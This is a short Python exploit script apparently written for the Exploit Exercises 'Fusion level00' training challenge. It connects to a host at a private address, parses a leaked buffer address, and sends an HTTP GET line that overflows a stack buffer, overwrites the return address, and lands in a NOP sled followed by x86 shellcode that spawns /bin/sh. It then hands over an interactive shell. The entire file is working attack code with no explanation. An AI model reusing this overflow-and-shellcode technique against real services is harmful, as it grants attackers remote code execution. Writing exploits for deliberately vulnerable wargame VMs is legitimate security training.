# exploit-ex fusion level00
from err0rless import connst, dump
from struct import pack

s, t = connst("192.168.95.152", 20000)

sc = ("\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68"
      "\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\xCD\x80")

def pMain():
    buffer = int(s.recv(1024)[21:-5], 0x10)
    
    eip  = "A" * 139 + pack("I", buffer + 0x100)
    code = "\x90" * 0x200 + sc

    s.send("GET " + eip + " HTTP/1.1" + code + "\n")

    t.interact()

if __name__ == "__main__":
    pMain()